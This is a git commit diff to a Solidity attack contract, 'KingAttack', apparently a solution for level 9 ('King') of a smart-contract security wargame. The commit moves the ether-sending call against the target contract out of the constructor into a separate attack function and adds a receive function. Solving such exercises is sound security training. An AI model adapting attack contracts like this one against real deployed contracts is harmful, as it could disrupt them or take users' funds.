fefa2c9a9ae41893c9519f32406668acef291fe5
Kamil Chmielewski <chmielewski.kamil45@gmail.com>
2022-10-29 16:46:27 +0200

    ♻️ refactor: separate attack logic from constructor

--- src/levels/09-King/KingAttack.sol
+++ src/levels/09-King/KingAttack.sol
@@ -6,9 +6,14 @@ import "./King.sol";
 contract KingAttack {
     King king;
 
-    constructor(address payable _kingContractAddress) public payable {
+    constructor(address payable _kingContractAddress) public {
         king = King(_kingContractAddress);
+    }
+
+    function attack() public payable {
         (bool success, ) = address(king).call{value: msg.value}("");
         require(success, "King call failed");
     }
+
+    receive() external payable {}
 }
